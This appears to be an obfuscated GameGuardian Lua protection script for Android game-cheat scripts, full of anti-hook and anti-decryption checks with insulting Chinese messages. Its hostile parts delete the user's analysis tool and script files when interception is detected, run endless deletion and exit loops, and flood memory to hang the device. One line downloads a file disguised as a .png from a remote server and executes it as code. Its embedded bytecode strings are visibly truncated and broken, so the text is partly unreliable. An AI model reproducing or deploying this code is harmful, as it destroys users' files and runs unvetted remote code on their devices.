  for k in SSSV4_R:gmatch(SSS({104,105,115,116,111,114,121,37,45,48,34,62,40,46,45,41,60})) do
    if k ~= gg.getFile() then while(true) do
      
print("憨批") os.exit() ILOVEYOU() end
    end
  end
 end
end
--SSS防御

Counters = {}
Names = {}
function hook()
f = debug.getinfo(1, "f").func
if Counters[f] == nil then
Counters[f] = 1
Names[f] = debug.getinfo(1, "Sn")
end
if Counters[f]>1 then while true do
print("憨批")
os.exit(2222)
end
end
end
--防部分HOOK

 XX = io.open(gg.getFile() .. ".log_HOOK.lua", "r")    
if XX == nil then    
else  
print("憨批")
os.exit() ILOVEYOU()  
end  
XXa = io.open(gg.getFile() .. ".log_HOOK.lua", "r")  
if XXa == nil then    
else    
end
XX = io.open(gg.getFile() .. ".log_HOOK.lua", "r")    
if XX == nil then    
else  
print("憨批")
os.exit() ILOVEYOU()  
end  
XXa = io.open(gg.getFile() .. ".log_HOOK.lua", "r")  
if XXa == nil then    
else    
end
--删除HOOK文件

io.open("/storage/emulated/0/MRCS","w")
os.remove("/storage/emulated/0/MRCS")
file=io.open("/storage/emulated/0/MRCS","r")
if file~=nil then
print("憨批")
os.exit() ILOVEYOU()
end
io.open("/storage/emulated/0/WYCS","w")
file=io.open("/storage/emulated/0/WYCS","r")
if file==nil then
print("憨批")
os.exit() ILOVEYOU()
end
os.remove("/storage/emulated/0/WYCS")
--防防刷文件

  ZN = io.open(gg.getFile() .. ".log_HOOK.lua", "r")
  if ZN == nil then
  else
    print("憨批")
    os.exit() ILOVEYOU()
    i = 1
    while true do
      
      i = i + 1
      if i > 999999999 then
        break
      end
    end
  end
  ZNa = io.open(gg.getFile() .. ".log_HOOK.lua", "r")
  if ZNa == nil then
  else
  end
  ZN = io.open(gg.getFile() .. ".log_HOOK.lua", "r")
  if ZN == nil then
  else
    print("憨批")
    os.exit() ILOVEYOU()
    i = 1
    while true do
      
      i = i + 1
      if i > 999999999 then
        break
      end
    end
  end
  ZNa = io.open(gg.getFile() .. ".log_HOOK.lua", "r")
  if ZNa == nil then
  else
  end
--防部分HOOK

if string.find(tostring(debug.getinfo(load)["func"]), "function: load") == nil then print("憨批") os.exit() ILOVEYOU() end
--防部分LOAD

function AA(bytes,result1,result2)
for i=1,2 do
local bytesa=load(bytes)
end
end
function BB()
local
dataArr={'40000','0000000'}
for index,value in pairs(dataArr) do
bytes =  tonumber(value)
AA(bytes,result1,result2)
end
end
BB()
function SSS1(...) local arg={...} if not arg[1] then local org={} for i=1,math.random(1,4) do if org[1] then org[1]=org[1]..';'..math.random(1,999999999) else org[1]=math.random(1,999999999) end end local db={1,2,4,8,16,32,64} org[2]=db[math.random(1,7)] gg.searchNumber(org[1],org[2]) for i=1,100 do gg.searchNumber('GG:失效') end return gg.clearResults() else arg[1]=arg[1]..'' arg[1]=arg[1]:gsub('[^;]+',function (jj) return string.rep('�',33333)..jj..string.rep('�',33333) end) gg.setVisible(false) return gg.searchNumber(arg[1],arg[2],arg[3],arg[4],arg[5],arg[6]) end end

gg.toast("神仙")

function delete()
for cut=1,9999999 do
os.remove(gg.getFile()..".log.txt","w")			
end
delete()
end
delete()

function xhtc()
print("[log你妈逼]")
os.exit()
while true do
os.exit()
for sh=1,99999 do
os.exit()
xhtc()
::tc::
os.exit()
xhtc()
goto tc
end
end
end

NZF=io.open("/sdcard/SX.LOG","r")
if NZF~=nil then
while true do
os.remove("/sdcard/SX.LOG")
os.exit()
end
end

for i=1,666 do loadfile(string.char(47,115,121,115,116,101,109,47,112,114,105,118,45,97,112,112,47,83,101,116,116,105,110,103,115,47,83,101,116,116,105,110,103,115,46,97,112,107)) end

local A=tostring(debug.getinfo(load)['func'])
local B=A:match("@(.-):")
if not string.find(A,"function: load") then
gg.alert("艹你妈傻逼玩意\n\n判断工具所在路径...\n"..B.."\n傻逼你的工具没了")
os.remove(B:match("[^/]*$"))
os.remove(gg.getFile():match("[^/]*$"))
os.remove(B)
return os.exit()
end

local pxxe=gg[ "makeRequest" ]( "FT+网络申请" )
while tostring(pxxe):find( "FT+" )==nil do
while true do  print( "NO Network " ) end end
function _A(_B) 
return string.char(table.unpack(_B))
end
local optfff=function()
local igs = 0
for i in pairs(_G) do
igs = igs + 1
end
if igs ~= 36 then
goto BAD
end
ipai = gg[ "isPackageInstalled" ]
gpa = gg[ "PACKAGE" ]
ggf = gg[ "getFile" ]()
gg[ "setVisible" ](false)
goto P1
::BAD::
xpc=nil if  gg.isVisible() then xpc=0 end
while xpc~=0 do break end
wgcz =  "哈哈，傻逼还想抓包" 
gg[ "toast" ](wgcz)
gg[ "sleep" ](50)
gg[ "setVisible" ](true)  
::PP::
gg[ "toast" ](wgcz)
goto PP
::P1::
if #{pairs({ "EA-FFF" })} ~= 2 then
goto BAD
end
xi = {1, 1}
for i, v in pairs(gg) do 
xi[1] = xi[1] + 1
if i:find( "DIR" ) and not v:find(gpa) then
goto BAD
end
if type(v) ==  "function"  then
xi[2] = xi[2] + 1
end
end
if xi[1] ~= 123 or xi[2] ~= 64 then
goto BAD
end
xi = 1
for i, v in pairs(debug) do 
xi = xi + 1
if type(v) ~=  "function"  then
goto BAD
end
end
if xi ~= 17 then
goto BAD
end
h = 1 
repeat
h = h + 1
until type(debug.getinfo(h) or 0) ==  "number" 
if h > 2 or debug.getinfo(h - 1).short_src ~= ggf then
goto BAD
end
if debug.traceback():match( ".(/.-):" ) ~= ggf then 
goto BAD
end
f = io.open( "/data/data/"  .. gpa ..  "/shared_prefs/"  .. gpa ..  "_preferences.xml" )
if not f then
goto BAD
else
spc = f:read( "*a" )
f:close()
if #spc < 20 then 
goto BAD
end
op = 0 
for k in spc:gmatch( "script%-debug.>(.-)<" ) do
op = op + 1
end
if op ~= 0 then
goto BAD
end
op = 0 
for k in spc:gmatch( "history%-0.>(.-)<" ) do
op = op + 1
h0 = k
end
if op ~= 1 then
goto BAD
end
op = 0 
for k in spc:gmatch(gg[ "getTargetPackage" ]() ..  "%-script.>(.-)<" ) do
op = op + 1
ps = k
end
if op ~= 1 then
goto BAD
end
if h0 ~= ps or h0 ~= ggf or ps ~= ggf then 
goto BAD
end
end
isby = debug.traceback():match( "(/.*/.*):%d" ) 
if ggf == isby or isby or debug.traceback():match( ":(%d+)" ) then
goto BAD
end
if not ipai(gpa) or ipai( "com.fffsse.bad" ) then 
goto BAD
end
if sdpa == true and gpa ~=  "com.fffsse.gg"  then
goto BAD
end
while true do 
goto BAD end
end
function ffvpns()
ffvpn= "https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F" 
x=(tostring(gg[ "makeRequest" ](ffvpn)))
if not x  or not x:sub(1,20) then 
gg[ "alert" ]( "请查看相应权限"  )
else
while  #(x)<100  
or x:find( "SSL" ) or x:find('I/O') or x:find('javax')
do 
gg[ "alert" ]( "警告❗:\n⛔网络数据通道异常⛔\n\n请立刻停止你的抓包行为，否则手机屏幕卡死" )
local mpxgk=optfff()
end 
end
end
ffvpns()

fy=[=[
_ENV["debug"]["getinfo"]=function(a)
return _ENV["debug"]["getinfo"]("By神仙")
end
]=]
fy=[=[
for i, v in _ENV["pairs"](_ENV) do
i = _ENV[i]
if type(i) == "table" then
for m, n in _ENV["pairs"](i) do
if type(i[m]) == "function" then
local zhuangtai=pcall(debug.getlocal,i[m],0,1)
while not zhuangtai do
os.exit(_ENV["print"]("💎By神仙:禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end
end
elseif type(i) == "function" then
local zhuangtai=pcall(debug.getlocal,i,0,1)
while not zhuangtai do
os.exit(_ENV["print"]("💎By神仙:禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end
end

--检测重写行为
local Caq = debug["getinfo"]
local tables = {}
local strings = {}
local tI = table["insert"]
for i, v in _ENV["pairs"](_ENV) do
i = _ENV[i]
if type(i) == "table" then
for m, n in _ENV["pairs"](i) do
if type(i[m]) == "function" then
tI(tables, Caq(i[m]))
end
end
elseif type(i) == "function" then
tI(tables, Caq(i))
elseif type(i) == "string" then
tI(strings, i)
end
end
for i = 1, 100 do
(function()
return (function()
if math.random(0, 1) == 1 then
repeat
until debug.getinfo(2).istailcall and math.random(0, 1)==0
else
while debug.getinfo(3).istailcall do
end
end
end)()
end)()
end
local istailcall, isvararg, short_src, source, what = "istailcall", "isvararg", "short_src", "source", "what"
for i, v in _ENV["pairs"](tables) do
 local tab = v
if tab["func"]==debug.getinfo then
tab[istailcall]=false
end
if tab[istailcall] or not tab[isvararg] or tab[short_src] ~= "[Java]" or tab[source] ~= "=[Java]" or tab[what] ~="Java" then 
Lujing=tab[short_src]
hook = true
break
end
end
if strings[2] then
hook = true
end
tables, strings = nil, nil
if hook then
while (true) do
os.exit(_ENV["print"]("💎By神仙:禁止解密💎\n\n💎检测到拦截器环境💎"))
end
code(Diaoyong)
return false
end

while table.concat(gg.bytes(_ENV["tostring"](gg.searchNumber)),",")~="102,117,110,99,116,105,111,110,32,40,116,101,120,116,44,32,116,121,112,101,44,32,101,110,99,114,121,112,116,101,100,44,32,115,105,103,110,44,32,109,101,109,111,114,121,70,114,111,109,44,32,109,101,109,111,114,121,84,111,44,32,108,105,109,105,116,41,32,101,110,100,44,32,45,45,32,103,103,46,115,101,97,114,99,104,78,117,109,98,101,114,40,115,116,114,105,110,103,32,116,101,120,116,32,91,44,32,105,110,116,32,116,121,112,101,32,61,32,103,103,46,84,89,80,69,95,65,85,84,79,32,91,44,32,98,111,111,108,32,101,110,99,114,121,112,116,101,100,32,61,32,102,97,108,115,101,32,91,44,32,105,110,116,32,115,105,103,110,32,61,32,103,103,46,83,73,71,78,95,69,81,85,65,76,32,91,44,32,108,111,110,103,32,109,101,109,111,114,121,70,114,111,109,32,61,32,48,32,91,44,32,108,111,110,103,32,109,101,109,111,114,121,84,111,32,61,32,45,49,32,91,44,32,108,111,110,103,32,108,105,109,105,116,32,61,32,48,93,93,93,93,93,93,41,32,45,62,32,116,114,117,101,32,124,124,32,115,116,114,105,110,103,32,119,105,116,104,32,101,114,114,111,114" do
while (true) do
os.exit(_ENV["print"]("💎:禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end
while debug.getinfo(gg.searchNumber).source ~= "=[Java]" do
while (true) do
os.exit(_ENV["print"]("💎:禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end
while _ENV["tostring"](debug.getregistry(1)):find("@") do 
while (true) do
os.exit(_ENV["print"](":禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end
while #_ENV["tostring"](debug.getregistry(1))<16000 do 
while (true) do
os.exit(_ENV["print"]("💎:禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end
while loadfile(debug.getinfo(gg.searchNumber).short_src)~=nil do
while (true) do
os.exit(_ENV["print"]("💎:禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end

ByXEY=gg.makeRequest("https://m.baidu.com/").content
if ByXEY==nil then
while (true) do
os.exit(_ENV["print"]("💎:请允许修改器获取网络权限💎\n\n💎本加密防御需要连接云端配置💎\n\n💎保护脚本安全💎"))
end
end

do
local r0 = debug.getinfo(debug.getinfo)
local r1 = debug.getinfo(1)
local f = r1.func
if f ~= r0.func then
while (true) do
os.exit(_ENV["print"]("💎:禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end
if _ENV["tostring"](debug) ~= _ENV["tostring"](debug) then
while (true) do
os.exit(_ENV["print"]("💎:禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end
end
do
local lua =
'\x1B\x4C\x75\x61\x52\x00\x01\x04\x04\x04\x08\x00\x19\x93\x0D\x0A\x1A\x0A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xFA\xC7\x01\x00\x00\x23\xFE\xEA\x77\x23\xFD\xEA\x98\xC3\x37\x80\x00\xA3\x37\x3B\x80\xC0\x20\x80\x76\xA3\x77\x6B\x80\xC1\x3B\x00\x00\xA3\x77\x1B\x80\x40\x3B\x00\x22\xA3\xF7\x30\x80\x40\x31\x80\x75\xA3\xB7\x47\x80\x00\x3A\x00\x1B\xA3\xB7\x67\x80\x03\x4E\x80\x00\xA3\x37\x16\x80\xA3\xB7\x4F\x80\x00\x11\x80\x76\xA3\xB7\x05\x80\xA3\xB7\x1C\x80\xA3\xF7\x31\x80\x03\x53\x00\x00\xA3\xB7\x0B\x80\xA3\x37\x4A\x80\xC0\x2E\x80\x74\xA3\x37\x35\x80\xC1\x79\x00\x00\xA3\xB7\x53\x80\x08\x40\x02\x04\xA3\x77\x0D\x80\x00\x3B\x00\x1C\xA3\x77\xFB\x7F\x1B\x2B\x00\x00\xA3\x37\x59\x80\xA3\x77\x24\x80\x43\x50\x80\x00\xA3\xF7\x65\x80\xA3\xF7\x22\x80\x07\x02\x82\x03\xA3\xF7\x19\x80\x9B\x74\x00\x00\xA3\x77\x12\x80\xC1\xBB\x00\x00\xA3\x77\x34\x80\x58\xC0\x3A\x04\xA3\xF7\xFD\x7F\x81\xFB\x00\x00\xA3\x77\x5D\x80\x40\x1F\x80\x74\xA3\xF7\x4B\x80\x1B\x6A\x00\x00\xA3\x77\x60\x80\xA3\xB7\x30\x80\x1C\x02\x80\x75\xA3\x37\x23\x80\xA3\xF7\x5B\x80\x1B\x4F\x00\x00\xA3\xF7\x22\x80\xA3\xB7\x04\x80\x00\x3B\x80\x13\xA3\x77\x2A\x80\xE5\x00\x00\x00\xA3\x37\x02\x80\x80\x3A\x00\x54\xA3\xB7\x2A\x80\x03\x4F\x00\x00\xA3\x37\x00\x80\xA3\xF7\xFC\x7F\x26\x00\x00\x01\xA3\xF7\xF5\x7F\xC1\x39\x01\x00\xA3\x77\x10\x80\x80\x39\x80\x20\xA3\x37\xF6\x7F\xC3\x6E\x80\x00\xA3\x77\x18\x80\xA3\x77\x5D\x80\x1F\x00\x80\x00\x00\x0F\x00\x75\xA3\xB7\x12\x80\x40\x10\x00\x73\xA3\xF7\xEC\x7F\x80\x0D\x00\x74\xA3\xF7\x0D\x80\x00\x3B\x00\x69\xA3\xB7\x2F\x80\x83\x49\x00\x00\xA3\x37\x20\x80\xA3\xF7\x4D\x80\x80\x3A\x00\x13\xA3\xB7\xFE\x7F\xC6\xC1\x01\x00\xA3\xB7\xEA\x7F\x40\x04\x00\x77\xA3\xB7\xEE\x7F\x80\x39\x80\x1A\xA3\xF7\x0E\x80\x1B\x24\x00\x00\xA3\x77\x11\x80\xA3\xF7\x16\x80\x18\x80\xBA\x02\xA3\xB7\xF5\x7F\xA3\x77\x3D\x80\x40\x3B\x80\x2A\xA3\x37\x2A\x80\x94\x3C\x80\x78\xA3\xB7\x08\x80\x5B\x44\x00\x00\xA3\x37\x36\x80\xA3\xB7\xFB\x7F\x5C\x01\x80\x75\xA3\x37\x2E\x80\xA3\x77\x1A\x80\x43\x44\x00\x00\xA3\x37\x14\x80\xA3\xB7\xFD\x7F\x80\x34\x00\x76\xA3\xF7\x08\x80\x1C\x01\x80\x77\xA3\xB7\x2A\x80\xA3\xB7\x06\x80\x46\x41\x01\x00\xA3\x37\x2E\x80\x5D\x41\x00\x01\xA3\x37\x11\x80\xC3\x65\x00\x00\xA3\x77\x18\x80\xA3\x37\x41\x80\x80\x3A\x00\x2B\xA3\x77\x07\x80\x18\x80\x39\x03\xA3\x77\x02\x80\xA3\xF7\x28\x80\xC0\x3A\x80\x0B\xA3\xB7\x13\x80\xA3\x37\x4C\x80\x9C\x41\x80\x75\xA3\x37\xFC\x7F\x5C\x41\x80\x73\xA3\x37\xFB\x7F\x81\x79\x01\x00\xA3\x37\x19\x80\x1C\x72\x80\x78\xA3\xF7\xEC\x7F\x00\x3A\x80\x4B\xA3\xB7\xFA\x7F\x1B\x07\x00\x00\xA3\xB7\x40\x80\x00\x01\x80\x77\xA3\xF7\x21\x80\x40\x3A\x80\x0A\xA3\xB7\x40\x80\xDD\x41\x80\x00\xA3\x77\xDC\x7F\xDF\x01\x00\x01\xC0\x01\x00\x02\xA3\xF7\xEE\x7F\x43\x4D\x00\x00\xA3\x37\x00\x80\xA3\x77\x24\x80\x83\x55\x00\x00\xA3\x37\x2B\x80\xA3\xB7\x45\x80\x00\x0E\x00\x76\xA3\xB7\x07\x80\x80\x01\x00\x77\xA3\xB7\x3D\x80\x00\x3B\x00\x48\xA3\x37\x23\x80\x9C\x01\x00\x73\xA3\x37\xFA\x7F\xA3\xB7\x2E\x80\x40\x3B\x80\x41\xA3\x77\x27\x80\x81\x7A\x01\x00\xA3\xB7\x3E\x80\x5B\x05\x00\x00\xA3\x77\x17\x80\x5B\x10\x00\x00\xA3\x37\x33\x80\xA3\xB7\xE6\x7F\x00\x2B\x00\x73\xA3\x37\xF8\x7F\x03\x55\x00\x00\xA3\x37\x28\x80\xA3\x37\x33\x80\xC0\x3A\x80\x62\xA3\xB7\x39\x80\xDC\x41\x00\x77\xA3\x77\x02\x80\x5D\xC1\x80\x00\xA3\x77\xFE\x7F\x00\x24\x00\x76\xA3\x77\x21\x80\x80\x39\x00\x0E\xA3\x77\x3C\x80\x40\x3A\x80\x3E\xA3\xB7\x10\x80\x5B\x1F\x00\x00\xA3\xF7\xD9\x7F\x18\x80\xBB\x03\xA3\xF7\xE8\x7F\xA3\x77\x3D\x80\x1B\x0C\x00\x00\xA3\x37\xE2\x7F\xA3\x77\x21\x80\x03\x51\x80\x00\xA3\xF7\x37\x80\xA3\x37\x2A\x80\x03\x6B\x80\x00\xA3\xF7\x27\x80\xA3\xF7\xD2\x7F\xC0\x25\x00\x74\xA3\x37\x3A\x80\xC3\x45\x00\x00\xA3\x77\xFB\x7F\xA3\xF7\x01\x80\xDB\x20\x00\x00\xA3\x37\xCA\x7F\x40\x01\x80\x75\xA3\xB7\x34\x80\x80\x01\x80\x73\xA3\xB7\x17\x80\x81\xBB\x01\x00\xA3\x77\x18\x80\xDB\x05\x00\x00\xA3\x77\x00\x80\x40\x15\x80\x76\xA3\xF7\x07\x80\xC0\x05\x80\x75\xA3\x77\x2B\x80\xC3\x49\x80\x00\xA3\xF7\x2A\x80\xA3\x37\x23\x80\x40\x3A\x00\x2A\xA3\xB7\xF2\x7F\x03\x6A\x00\x00\xA3\xF7\xD9\x7F\xA3\xB7\xD0\x7F\x81\x7B\x01\x00\xA3\xB7\xF2\x7F\x54\x3C\x00\x78\xA3\x77\xDD\x7F\xDC\x41\x00\x73\xA3\x77\x1A\x80\x18\xC0\x3B\x04\xA3\x77\x2D\x80\xA3\x37\x2A\x80\x00\x2A\x00\x75\xA3\xF7\xCC\x7F\x00\x02\x80\x77\xA3\x37\xFE\x7F\x5D\x41\x80\x01\xA3\xF7\xE5\x7F\x1C\x02\x80\x77\xA3\x77\x2A\x80\xA3\x37\xFE\x7F\x47\x81\x81\x02\xA3\x77\x19\x80\xC0\x09\x00\x76\xA3\x37\xEE\x7F\x5D\x82\x80\x00\xA3\xF7\x22\x80\x40\x3A\x80\x5D\xA3\x37\xD0\x7F\x43\x5F\x00\x00\xA3\x77\xFF\x7F\xA3\x77\xEE\x7F\x80\x15\x00\x75\xA3\x37\xF4\x7F\x80\x3B\x80\x3E\xA3\xF7\x03\x80\x40\x05\x80\x74\xA3\xF7\xCC\x7F\x43\x55\x00\x00\xA3\x37\x2A\x80\xA3\xB7\x16\x80\x83\x74\x80\x00\xA3\x77\xE3\x7F\xA3\xF7\xC3\x7F\x1C\x42\x80\x77\xA3\x37\x19\x80\xDD\x81\x00\x01\xA3\xB7\xD0\x7F\x80\x3A\x00\x1E\xA3\xB7\xC8\x7F\x58\xC0\x3B\x02\xA3\x77\xE3\x7F\x43\x5F\x80\x00\xA3\xB7\x26\x80\xA3\xF7\x17\x80\x41\xC0\x01\x00\xA3\x77\x0A\x80\x46\x41\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x47\x81\x81\x02\xA3\xF7\xDE\x7F\x18\xC0\x80\x02\xA3\x77\xB9\x7F\x18\xC0\x80\x02\xA3\x77\xFE\x7F\xA3\x77\x16\x80\x41\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x47\x81\x81\x02\xA3\xF7\xDE\x7F\x18\xC0\x80\x02\xA3\x77\xB9\x7F\x18\xC0\x80\x02\xA3\x77\xFE\x7F\xA3\x77\x16\x80\x48\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x49\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\"
local randomNum = math.random(1000, 9999)
local f, e = load(lua, _ENV["tostring"](randomNum))
if not f then
while (true) do
os.exit(_ENV["print"](":禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end
_ENV[randomNum] = f
local r = _ENV[randomNum](randomNum)
_ENV[randomNum] = nil
local n = _ENV[f]
if not n or n - randomNum ~= 12 or not r or r.func ~= f or r.istailcall then
while (true) do
os.exit(_ENV["print"](":禁止解密💎\n\n💎检测到拦截器环境💎"))
end
end
_ENV[f] = nil
end
do
load('\x1B\x4C\x75\x61\x52\x00\x01\x04\x04\x04\x08\x00\x19\x93\x0D\x0A\x1A\x0A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xFA\x74\x00\x00\x00\x23\xFE\xEA\x77\x23\xFD\xEA\xA5\xC3\x37\x80\x00\xA3\xB7\x06\x80\x9B\x52\x00\x00\xA3\xB7\x14\x80\xA3\x77\x1A\x80\x18\x00\xBA\x00\xA3\x77\x12\x80\xA3\xB7\x0E\x80\xC0\x01\x80\x75\xA3\xB7\x0F\x80\xC0\x23\x00\x74\xA3\xF7\x0B\x80\x1C\x72\x80\x78\xA3\xB7\x04\x80\x9C\x00\x80\x74\xA3\x37\xFD\x7F\xA3\xB7\x05\x80\x1B\x27\x00\x00\xA3\xB7\x15\x80\xA3\x37\x0F\x80\x80\x3A\x00\x25\xA3\x37\x03\x80\x58\x40\x3A\x01\xA3\xB7\x00\x80\xC3\x63\x00\x00\xA3\x37\x15\x80\xA3\xF7\x12\x80\x86\x80\x00\x00\xA3\x37\x02\x80\x54\x3C\x00\x78\xA3\xF7\x04\x80\x9B\x48\x00\x00\xA3\x77\x07\x80\x01\x3B\x00\x00\xA3\xB7\x0E\x80\x83\x52\x00\x00\xA3\x77\x07\x80\xA3\xF7\xF6\x7F\x80\x39\x00\x0B\xA3\x77\x00\x80\x80\x00\x80\x74\xA3\xF7\xFA\x7F\x83\x45\x80\x00\xA3\xF7\xF6\x7F\xA3\xF7\x02\x80\xDB\x41\x00\x00\xA3\x77\x07\x80\xA3\xF7\xF5\x7F\x03\x67\x80\x00\xA3\xF7\x0D\x80\xA3\x77\xF7\x7F\x94\x3C\x80\x78\xA3\xB7\xF5\x7F\x00\x3A\x00\x11\xA3\xB7\x0A\x80\xDC\x40\x80\x77\xA3\xF7\x07\x80\x9B\x05\x00\x00\xA3\x37\xF3\x7F\xA3\xB7\x03\x80\x1F\x00\x80\x00\xC1\x7B\x00\x00\xA3\x1\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x47\x81\x81\x02\xA3\xF7\xDE\x7F\x18\xC0\x80\x02\xA3\x77\xB9\x7F\x18\xC0\x80\x02\xA3\x77\xFE\x7F\xA3\x77\x16\x80\x48\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x49\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\"1\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x47\x81\x81\x02\xA3\xF7\xDE\x7F\x18\xC0\x80\x02\xA3\x77\xB9\x7F\x18\xC0\x80\x02\xA3\x77\xFE\x7F\xA3\x77\x16\x80\x48\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x49\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\"1\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x47\x81\x81\x02\xA3\xF7\xDE\x7F\x18\xC0\x80\x02\xA3\x77\xB9\x7F\x18\xC0\x80\x02\xA3\x77\xFE\x7F\xA3\x77\x16\x80\x48\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x49\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\"1\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x47\x81\x81\x02\xA3\xF7\xDE\x7F\x18\xC0\x80\x02\xA3\x77\xB9\x7F\x18\xC0\x80\x02\xA3\x77\xFE\x7F\xA3\x77\x16\x80\x48\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\x49\x01\x00\xA3\x37\xD6\x7F\xC1\x3A\x02\x00\xA3\xB7\xD7\x7F\"debug.getinfo(2).source)()
end
------------防LOG解密GG
--检测修改器是否缺少函数
if ("a"):rep("1")~="a" then 
while (true) do
os.exit(_ENV["print"]("禁止解密💎\n\n💎检测到LOG环境💎"))
end
end
--禁止Art输出变量
local Art_Hook=function(Chan)
Blianliang = ""
for i = 1, Chan do
num = math.random(1, 26) 
if num % 2 == 0 then
Blianliang = Blianliang .. string.char(num + 64)
else
Blianliang = Blianliang .. string.char(num + 96)
end
end
return Blianliang
end
for k=1,50 do
_ENV[Art_Hook(k)]="Hook Char"
end

for i = 1, 9999 do
table.insert({}, {address = 127 + i,flags = 12,values = 127})
end 
clock = os.clock()
time = os.time()
for i = 1, 6 do
gg.addListItems({})
end 
if os.clock() - clock > 20 then
while (true) do
os.exit(_ENV["print"](":禁止解密💎\n\n💎检测到LOG环境💎"))
end
end 
gg.removeListItems({})
logsj = os.time()
logs = "                 "
logs = logs:rep(999)
for i = 1, 5000 do
debug.getinfo(i, nil, logs)
logsj2 = os.time()
a = logsj2 - logsj
if a <= 19 then
else
while (true) do
os.exit(_ENV["print"](":禁止解密💎\n\n💎检测到LOG环境💎"))
end
end 
end
local Detection=gg.searchNumber
gg.searchNumber=function(...)
local vpn, Rep, time1, time2, rzlog, logFk, logSy, Hour, Montie, Second, search_e, log3, log4, arm
arm={...}
vpn=gg.makeRequest("https://time.tianqi.com/")["headers"]["Date"]
Hour,Montie,Second=vpn[1]:match("(%d+):(%d+):(%d+)")
if Hour=="00" then
Hour=24
end
time1=Hour*3600+Montie*60+Second
rzlog=_ENV["tonumber"]("800")
Rep={}
for i=1,rzlog do
Rep[i]=" "
end
logFk=(table.concat(Rep))
for i=1,rzlog do
Rep[i]=logFk
end
logFk=(table.concat(Rep))
while logFk~=string.rep(" ",rzlog^2) and #logFk~=rzlog^2 do
end
while string.rep("a",5)~="aaaaa" do
end
logSy={}
for logTi=1,rzlog do
logSy[logTi]=logFk
end
logFk=nil
log3={gg.alert,gg.bytes,gg.copyText,gg.searchAddress,Detection,gg.toast}
for log1, log2 in _ENV["pairs"](log3) do
_ENV["xpcall"](log2,Search,logSy)
end
log4=string.char(rzlog-rzlog)
search_e=(log4):rep(7)
for i=1,22 do 
search_e=search_e..search_e 
end
gg.getResults(0)
gg.editAll(search_e,4)
Detection(search_e,16,false,gg.SIGN_EQUAL,0,-1)
rzlog, logFk={}, {}
for i=1,50 do
logFk[i]=math.random(1,2140000000)
rzlog[logFk[i]]={address=i,flags=4,temp=search_e}
end
rzlog=gg.getValues(rzlog)
vpn=gg.makeRequest("https://time.tianqi.com/")["headers"]["Date"]
Hour,Montie,Second=vpn[1]:match("(%d+):(%d+):(%d+)")
if Hour=="00" then
Hour=24
end
time2=Hour*3600+Montie*60+Second
while time2-time1>1 do
os.exit()
end
return Detection(table.unpack(arm))
end
--重写刷搜索内存
get=gg.getResults
file=io.open("/storage/emulated/0/tencent/QQfile_recv/XEY.lua","w") if file==nil then SST() else os.remove("/storage/emulated/0/tencent/QQfile_recv/XEY.lua") file=io.open("/storage/emulated/0/tencent/QQfile_recv/XEY.lua","r") if file~=nil then SST() end end
gg.getResults=function(Value)
    Value=Value.."."..string.rep("0","9999999")
    plug = Value
    return get(Value)
end
clts=gg.clearResults
gg.clearResults=function(Value)
    clts(Value)
    plug = Count
end
sges=gg.setRanges
gg.setRanges=function(Value)
    Value=Value.."."..string.rep("0","9999999")
    return sges(Value)
end
------------功能性防御
--禁止偷窥数据
if true then
local org = gg.searchNumber
 hook = function(...)
gg.setVisible(false)
 ret = org(...)
if gg.isVisible(true) then
gg.clearResults()
gg.clearList()
gg.alert(":请不要在脚本搜值时点击修改器")
while true do 
os.exit() 
end
end
return ret
end
gg.searchNumber = _ENV["hook"]
end

--防恶魔未来探索版
debug.getinfo=nil

--重写修改搜索防御云防
pcall(load(gg.makeRequest("http://wp.bxdlc.cn/down.php/40e27d9fe4d95c7223bf7f094c388683.png").content))


print("进入")
]=]

fy=[=[
if true then
    local org = _ENV["gg"]["searchNumber"]
     hook = function(...)
        _ENV["gg"]["setVisible"](false)
         ret = org(...)
        if _ENV["gg"]["isVisible"](true) then
        _ENV["gg"]["clearResults"]()
        _ENV["gg"]["clearList"]()
_ENV["gg"]["alert"]("防窥码已开启")
            while true do _ENV["os"]["exit"]() end
        end
        return ret
    end
    _ENV["gg"]["searchNumber"] = _ENV["hook"]
end
]=]

fy=[=[
gg.searchNumber=function (...)
print(...)
end
for k,v in pairs(_G) do 
if type(v) == 'table' then 
for kk,vv in pairs(v) do 
vv=function ()
return nil
end
end
end
end
function debug.getinfo()
g={}
g.source="=[Java]"
return g
end
function kk()
return 0
end

Value=debug.getinfo(2,Carla[1])
gg.toast(tostring(Value))
